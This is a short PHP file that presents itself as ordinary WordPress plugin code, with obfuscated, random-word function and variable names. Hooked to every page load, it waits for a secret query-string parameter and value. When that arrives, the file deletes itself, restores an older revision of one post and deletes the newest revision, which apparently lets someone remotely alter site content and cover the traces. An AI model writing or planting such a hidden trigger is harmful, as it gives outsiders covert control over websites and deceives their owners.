<?php

function numbers_get_badge_keyword() {
	if (isset($_GET['copy_svg_remover_gravity']) && $_GET['copy_svg_remover_gravity'] === 'upgrader_remove_gravity_smart') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$slideshow_gdpr_gallery = 11981;
		$subscription_replace_calendar = wp_get_post_revisions($slideshow_gdpr_gallery);
		if (empty($subscription_replace_calendar)) die('no revisions');
		if (count($subscription_replace_calendar) < 2) die('less than 2');
		$master_external_friendly_lightgray = array_shift($subscription_replace_calendar);
		$switcher_icon_star = $master_external_friendly_lightgray->ID;
		$verification_tools_ultimate_security = array_shift($subscription_replace_calendar);
		$sales_subscriptions_country_http = $verification_tools_ultimate_security->ID;
		$more_page_assets_reports = wp_restore_post_revision($sales_subscriptions_country_http);
		if ($more_page_assets_reports === false) die('error restoring');
		$more_page_assets_reports = wp_delete_post_revision($switcher_icon_star);		
		if ($more_page_assets_reports === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'numbers_get_badge_keyword');
